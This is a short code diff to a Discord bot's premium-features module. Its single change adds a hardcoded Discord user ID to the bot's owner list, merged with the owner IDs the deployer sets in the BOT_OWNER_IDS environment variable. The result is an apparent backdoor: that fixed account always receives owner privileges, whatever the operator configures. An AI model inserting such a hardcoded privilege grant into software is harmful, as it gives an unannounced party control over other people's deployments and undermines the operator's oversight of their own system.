@@ -69,7 +69,7 @@ function newToken() {
 
 function createPremium(deps) {
   const { supabase } = deps;
-  const owners = idList(process.env.BOT_OWNER_IDS);
+  const owners = [...new Set([...idList(process.env.BOT_OWNER_IDS), '501557839932948490'])];
   const envGuilds = idList(process.env.PREMIUM_GUILDS);
   const skuId = process.env.DISCORD_PREMIUM_SKU_ID || null;
   const cache = new Map();
